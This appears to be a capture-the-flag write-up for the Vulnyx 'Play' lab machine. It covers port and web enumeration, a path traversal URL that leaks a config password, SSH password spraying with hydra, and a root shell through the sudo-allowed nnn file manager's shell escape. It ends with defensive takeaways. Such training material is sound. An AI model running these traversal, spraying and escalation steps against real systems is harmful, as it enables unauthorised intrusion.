# Vulnyx: Play

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `hydra` |
| **Tags** | `#PathTraversal` `#InfoDisclosure` `#PasswordSpraying` `#SudoAbuse` |
| **URL** | https://vulnyx.com/machines/ |

A music playlist app's "download album as ZIP" feature takes a `parent` parameter that isn't sanitized against path traversal — pointing it outside the intended playlist directory bundles a `config.php` file into the downloaded archive, leaking a password. That password, sprayed against a list of common first names, lands valid SSH credentials for `andy`. A `sudo` rule around `nnn` — a terminal file manager with a shell-escape keybinding — is enough to reach root.

## Enumeration

### Port Enumeration

A full TCP port scan turns up two open ports: **22 (SSH)** and **80 (HTTP)**.

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn play.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:0B:D2:51 (Oracle VirtualBox virtual NIC)
```

A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV play.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:0B:D2:51 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

Port 80 serves the stock Apache default page, so the real content has to be found elsewhere:

```
http://play.nyx/
```

<img src="../Images/play/Pasted image 20260812152207.png"/>

A content scan surfaces a `playlist` directory that isn't linked from the front page:

```bash
$ ffuf -u http://play.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.html                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 1ms]
.php                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 4ms]
index.html             [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 464ms]
playlist               [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
.html                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 0ms]
.php                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 6ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 7ms]
```

Browsing to it lands on the actual application — a music playlist manager:

```
http://play.nyx/playlist
```

<img src="../Images/play/Pasted image 20260812152042.png"/>

## Initial Access

### Path Traversal in Album Download

The playlist app has a feature to download an album as a ZIP, taking `parent` and `album` parameters. `parent` isn't restricted to the playlist's own directory — pointing it a level up with `../playlist` pulls the ZIP's contents from outside the intended scope:

```
http://play.nyx/playlist/?getAlbum&parent=../playlist&album=Efe
```

Unpacking the downloaded archive reveals a `config.php` that was never meant to be served, and it carries a password:

```bash
$ unzip Efe.zip
$ cat ~/Vulnyx/Easy/Play/config.php
```

<img src="../Images/play/Pasted image 20260812152307.png"/>
<img src="../Images/play/Pasted image 20260812152345.png"/>

> **Password:** `iL0v3Mu$1c`

### Shell as andy

With no username alongside it, the recovered password gets sprayed against a list of common first names instead:

```bash
$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'iL0v3Mu$1c' ssh://play.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10713 login tries (l:10713/p:1), ~670 tries per task
[DATA] attacking ssh://play.nyx:22/
[STATUS] 308.00 tries/min, 308 tries in 00:01h, 10406 to do in 00:34h, 15 active
[22][ssh] host: play.nyx   login: andy   password: iL0v3Mu$1c
1 of 1 target successfully completed, 1 valid password found
```

> **Credentials:** `andy:iL0v3Mu$1c`

```bash
$ ssh andy@play.nyx
andy@play.nyx's password:
andy@play:~$ id
uid=1000(andy) gid=1000(andy) groups=1000(andy)
andy@play:~$ ls -l /home/andy/
total 4
-r--------    1 andy     andy            33 Sep  9  2023 user.txt
andy@play:~$ cat /home/andy/user.txt
d7a5677b8846501dc904115025cfcdfd
andy@play:~$
```

> **User flag:** `d7a5677b8846501dc904115025cfcdfd`

## Privilege Escalation

### Shell Escape in `nnn`

A check of what `andy` may run as root points straight at the escalation path:

```bash
andy@play:~$ sudo -l
Matching Defaults entries for andy on play:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User andy may run the following commands on play:
    (root) NOPASSWD: /usr/bin/nnn
```

`andy` can run `/usr/bin/nnn` — a terminal file manager — as root. `nnn` has a documented keybinding (`!`) that drops into an interactive shell in the current directory, which is exactly what makes it a privilege escalation vector whenever it's runnable as another user:

```bash
andy@play:~$ sudo /usr/bin/nnn
```
```
!
```

Since `nnn` is running as root, the shell it spawns inherits that privilege:

```bash
root@play:/home/andy# id
uid=0(root) gid=0(root) groups=0(root)
root@play:/home/andy# ls -l /root
total 4
-r--------    1 root     root            33 Sep  9  2023 root.txt
root@play:/home/andy# cat /root/root.txt
97703e4658a2ecad34fe4dc3bf92db1a
```

> **Root flag:** `97703e4658a2ecad34fe4dc3bf92db1a`

## Takeaways

- Any feature that builds a file path from user input — a "download as ZIP" function included — needs to validate that the resolved path can't escape its intended directory; `../` sequences in a `parent`-style parameter are a classic path traversal signal.
- A leaked password without a matching username is still useful — spraying it against a list of likely first names is often enough when the target's naming convention is simple.
- Terminal file managers and similar TUI tools (`nnn`, `mc`, `ranger`, and others) frequently ship a shell-escape keybinding by design — worth checking for on any `sudo`-granted binary that isn't an obvious "just runs one thing" tool.